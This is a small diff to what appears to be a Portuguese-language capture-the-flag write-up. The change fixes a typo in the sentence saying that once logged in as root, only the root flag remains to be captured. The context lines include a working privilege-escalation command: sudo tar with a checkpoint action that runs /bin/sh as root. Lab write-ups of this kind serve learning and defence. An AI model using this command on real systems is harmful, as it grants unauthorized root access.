@@ -69,4 +69,4 @@ If the binary is allowed to run as superuser by `sudo`, it does not drop the ele
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-Uma logado como root, é só capturar a flag de root.
+Uma vez logado como root, é só capturar a flag de root.
